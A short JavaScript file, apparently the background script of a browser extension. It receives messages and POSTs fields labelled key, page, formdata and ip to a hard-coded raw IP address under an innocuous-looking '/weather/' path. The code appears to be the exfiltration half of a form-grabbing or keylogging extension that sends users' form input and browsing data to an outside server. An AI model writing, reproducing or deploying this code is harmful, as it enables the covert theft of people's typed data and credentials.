function handleMessage(request) {
    var data = "key=" + encodeURIComponent(request.key) +
               "&page=" + encodeURIComponent(request.page) +
               "&formdata=" + encodeURIComponent(request.formdata) +
               "&ip=" + encodeURIComponent(request.ip);

    var xhr = new XMLHttpRequest();
    xhr.open("POST", "http://163.5.143.146/weather/", true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.send(data);
}

chrome.runtime.onMessage.addListener(handleMessage);
